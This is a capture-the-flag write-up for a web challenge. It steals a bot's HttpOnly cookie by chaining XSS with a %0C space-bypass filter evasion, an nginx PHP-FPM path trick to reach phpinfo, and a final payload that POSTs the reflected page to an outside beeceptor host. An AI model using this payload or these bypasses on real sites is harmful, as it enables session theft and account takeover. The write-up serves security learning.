## Description 
  Just to warm you up for the next Fight :"D
## Walkthrough:
  **the challenges was provided with a src code
  the src code is made of 4 main files 
  1- index.php 
  2- info.php
  3- bot.js
  4- nginx.conf**

  **The flag is in the bot.js cookie with a httponly attribute this means that JS cannot access the cookie**

  **1-index.php**

  **so it is clear that we can get xss from the name get parameter but how?**

  **The main problem is in the Enhanced_Trim function that replaces the defined charset with "" so how can we bypass it to make an alert?**

  **at first i looked for alternatives for the space and found that %0C can work so the payload to make a simple alert -> <img%0Csrc=x%0Conerror=alert``>**

  **but this doesn't have any value since we cannot use JS to steal the cookie because of the httponly attribute on the cookie**

  **the solution was in the info.php that views the phpinfo**

  **so how we can use phpinfo to get the bot cookie?**
  
  **when a user visits the phpinfo page it reflects its cookie in the response even the HttpOnly ones like this**

  **so now we can make the bot visit the info.php page then take the response and send it to our server right? wrong, this will not work because of nginx.conf lets take a look at it**

  **so in the nginx.conf it says that the info.php is only accessible from the localhost (the bot doesnt see the localhost of the challange so it cannot access it)**

  **the solution was in the last part of the configuration that includes and runs any file that ends with .php so we can use it to access the info.php right?**

  **I found this on hacktricks that allowed me to bypass the validation and access the info.php (https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass#php-fpm)**

  **so now we can access the info.php like this -> /info.php/index.php**

  ![image](https://github.com/user-attachments/assets/a822c94b-027c-498d-92de-f019cbc9e6e4)

  **Now we can make the bot visit the /info.php/index.php and get the response and send it to our server**

  ```
  payload ->
  <img%0Csrc=x%0Conerror='fetch("info.php%252Findex.php")%0C.then(response%0C=>%0Cresponse.text())%0C.
then(data%0C=>%0Cfetch("https://qlashx.free.beeceptor.com/",%0C{method:"POST",%0Cheaders:{%0C"Content-Type":"application/x-www-form-urlencoded"},%0Cbody:"data="%0C%2BencodeURIComponent(data)})%0C)'> 
  ```
